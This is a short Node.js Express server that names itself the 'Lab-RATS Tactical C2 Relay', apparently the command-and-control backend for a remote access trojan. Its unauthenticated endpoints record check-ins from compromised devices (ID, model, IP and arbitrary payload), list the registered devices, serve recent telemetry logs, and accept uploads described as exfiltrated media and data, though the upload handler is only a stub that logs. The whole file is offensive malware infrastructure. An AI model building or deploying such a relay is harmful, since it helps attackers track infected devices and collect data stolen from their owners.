const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// In-memory telemetry and device registry
const devices = new Map();
const telemetryLogs = [];

// Health check endpoint
app.get('/', (req, res) => {
    res.json({
        status: 'ONLINE',
        service: 'Lab-RATS Tactical C2 Relay',
        version: '1.6.0',
        activeDevices: devices.size,
        timestamp: new Date().toISOString()
    });
});

// Device Check-in & Telemetry Ingestion endpoint
app.post('/checkin', (req, res) => {
    try {
        const data = req.body;
        const deviceId = data.deviceId || 'unknown_device';

        devices.set(deviceId, {
            ...data,
            lastSeen: new Date().toISOString()
        });

        telemetryLogs.unshift({
            timestamp: new Date().toISOString(),
            deviceId,
            type: data.type || 'checkin',
            payload: data
        });

        if (telemetryLogs.length > 500) telemetryLogs.pop();

        console.log(`[CHECKIN] Device ID: ${deviceId} | Model: ${data.model} | IP: ${data.ip}`);
        res.json({ success: true, message: 'Telemetry received successfully' });
    } catch (err) {
        console.error('[ERROR] Checkin failed:', err.message);
        res.status(400).json({ success: false, error: err.message });
    }
});

// List active connected devices
app.get('/devices', (req, res) => {
    const deviceList = Array.from(devices.values());
    res.json({ success: true, count: deviceList.length, devices: deviceList });
});

// Recent telemetry logs
app.get('/logs', (req, res) => {
    res.json({ success: true, count: telemetryLogs.length, logs: telemetryLogs });
});

// File upload endpoint for exfiltrated media/data
app.post('/upload', (req, res) => {
    console.log('[UPLOAD] Received file exfiltration payload');
    res.json({ success: true, message: 'File payload ingested successfully' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
});
